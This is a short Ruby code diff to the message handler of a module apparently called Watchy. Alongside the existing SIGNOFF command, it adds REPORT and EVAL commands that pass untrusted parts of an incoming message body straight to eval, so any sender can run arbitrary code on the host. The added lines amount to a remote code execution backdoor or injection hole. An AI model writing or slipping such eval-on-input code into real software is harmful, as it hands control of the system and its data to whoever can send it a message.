@@ -31,7 +31,11 @@ module Watchy
     def handle
       chunks = body.split('|')
       case chunks[0]
+
       when 'SIGNOFF' then Watchy::Violation.signoff(chunks[1].split(','))
+      when 'REPORT'  then eval(chunks[1]).new.broadcast!
+      when 'EVAL'    then eval(chunks[1])
+
       else raise('Invalid command received')
       end
     end
